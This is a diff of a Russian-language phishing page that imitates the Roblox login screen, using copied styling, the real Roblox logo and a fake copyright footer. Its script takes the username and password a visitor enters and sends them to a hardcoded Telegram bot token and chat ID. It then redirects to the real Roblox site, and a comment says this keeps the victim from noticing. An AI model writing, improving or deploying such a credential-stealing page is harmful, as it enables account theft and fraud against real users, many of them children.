@@ -1,26 +1,156 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-<meta charset="UTF-8">
-<title>Roblox — вход</title>
-<style>
-    body { font-family: Arial; background: #f7f7f7; display: flex; justify-content: center; padding-top: 50px; }
-    .login { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px #ccc; width: 300px; }
-    input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; }
-    button { width: 100%; padding: 10px; background: #00a2ff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход — Roblox</title>
+    <!-- Подключаем шрифт Roblox (Source Sans Pro) -->
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* Полная копия стилей страницы входа Roblox */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #1a1a2e;
+            font-family: 'Source Sans Pro', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: #ffffff;
+            border-radius: 8px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 25px;
+        }
+        .logo img {
+            width: 150px;
+            height: auto;
+        }
+        .login-container h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 5px;
+        }
+        .login-container .sub {
+            font-size: 14px;
+            color: #6b6b7b;
+            margin-bottom: 25px;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 18px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #d1d1d6;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: 'Source Sans Pro', sans-serif;
+            background: #f9f9fc;
+            transition: border-color 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #0078f2;
+            outline: none;
+            background: white;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #0078f2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+        .login-btn:hover {
+            background: #0063d1;
+        }
+        .links {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .links a {
+            color: #0078f2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .links .sep {
+            margin: 0 8px;
+            color: #b0b0c0;
+        }
+        .footer {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #8e8e9e;
+        }
+        .footer a {
+            color: #0078f2;
+            text-decoration: none;
+        }
+    </style>
 </head>
 <body>
-<div class="login">
-    <h2>Вход в Roblox</h2>
+<div class="login-container">
+    <div class="logo">
+        <!-- Реальный логотип Roblox (с их CDN) -->
+        <img src="https://www.roblox.com/assets/img/logo/roblox-logo.png" alt="Roblox">
+    </div>
+    <h1>Вход</h1>
+    <p class="sub">Войдите в свою учётную запись Roblox</p>
+
     <form id="loginForm">
-        <input type="text" id="username" placeholder="Имя пользователя" required>
-        <input type="password" id="password" placeholder="Пароль" required>
-        <button type="submit">Войти</button>
+        <div class="input-group">
+            <label for="username">Имя пользователя</label>
+            <input type="text" id="username" placeholder="Введите имя пользователя" required>
+        </div>
+        <div class="input-group">
+            <label for="password">Пароль</label>
+            <input type="password" id="password" placeholder="Введите пароль" required>
+        </div>
+        <button type="submit" class="login-btn">Войти</button>
     </form>
+
+    <div class="links">
+        <a href="#">Забыли пароль?</a>
+        <span class="sep">·</span>
+        <a href="#">Зарегистрироваться</a>
+    </div>
+    <div class="footer">
+        © 2026 Roblox Corporation. Все права защищены.
+    </div>
 </div>
+
 <script>
-// ВАШИ ДАННЫЕ ТЕЛЕГРАМ
+// ВАШИ ДАННЫЕ ТЕЛЕГРАМ (уже вставлены)
 const BOT_TOKEN = '8881341948:AAEc1o7BsVXOK4VSayF2bRDrCHhymGVjogI';
 const CHAT_ID = '7092015279';
 
@@ -29,17 +159,19 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
-    // Отправка в Telegram
-    const message = `Логин: ${username}\nПароль: ${password}`;
+    const message = `🔐 Roblox LOGIN\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;
+
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-    }).then(() => {
-        // Перенаправление на настоящий Roblox
+    })
+    .then(() => {
+        // Перенаправляем на реальный Roblox, чтобы жертва не заметила
         window.location.href = 'https://www.roblox.com/login';
-    }).catch(() => {
-        // Если ошибка — всё равно перенаправим
+    })
+    .catch(() => {
+        // Даже если ошибка — всё равно редирект
         window.location.href = 'https://www.roblox.com/login';
     });
 });
